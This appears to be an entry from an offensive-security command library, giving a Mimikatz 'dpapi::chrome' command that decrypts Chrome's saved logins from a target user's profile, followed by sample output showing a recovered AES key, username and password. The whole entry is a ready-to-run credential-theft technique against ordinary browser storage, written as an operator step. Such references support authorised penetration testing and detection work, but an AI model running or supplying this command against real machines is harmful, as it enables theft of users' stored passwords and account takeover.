---
id: 555b2e1c-f04c-434a-958a-2b451f62526a
name: Mimikatz Extract Chrome Credentials from the Current User's Session
type: command
executor: command_prompt
data: mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User
  Data\Default\Login Data""" /unprotect" "exit"
output: "C:\\Windows\\System32\\spool\\drivers\\color>mimikatz.exe \"dpapi::chrome\
  \ /in:\"\"\"C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\\
  Login Data\"\"\" /unprotect\" \"exit\"\n\n  .#####.   mimikatz 2.2.0 (x64) #19041\
  \ May 19 2020 00:48:59\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\\
  \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##\
  \       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX\
  \             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com\
  \ / http://mysmartlogon.com   ***/\n\nmimikatz(commandline) # dpapi::chrome /in:\"\
  C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"\
  \ /unprotect\n> Encrypted Key found in local state file\n> Encrypted Key seems to\
  \ be protected by DPAPI\n * using CryptUnprotectData API\n> AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4\n\
  \nURL     : http://10.10.1.1/ ( http://10.10.1.1/ )\nUsername: admin\n * using BCrypt\
  \ with AES-256-GCM\nPassword: SuP3rUnCr4cK4B73\n\nmimikatz # exit\nBye!"
created_at: '2020-07-21T00:02:06.198050+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Mimikatz]]'
- '[[PingCastle]]'
---

# Mimikatz Extract Chrome Credentials from the Current User's Session

```command_prompt
mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```

## Expected Output

```
C:\Windows\System32\spool\drivers\color>mimikatz.exe "dpapi::chrome /in:"""C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4

URL     : http://10.10.1.1/ ( http://10.10.1.1/ )
Username: admin
 * using BCrypt with AES-256-GCM
Password: SuP3rUnCr4cK4B73

mimikatz # exit
Bye!
```


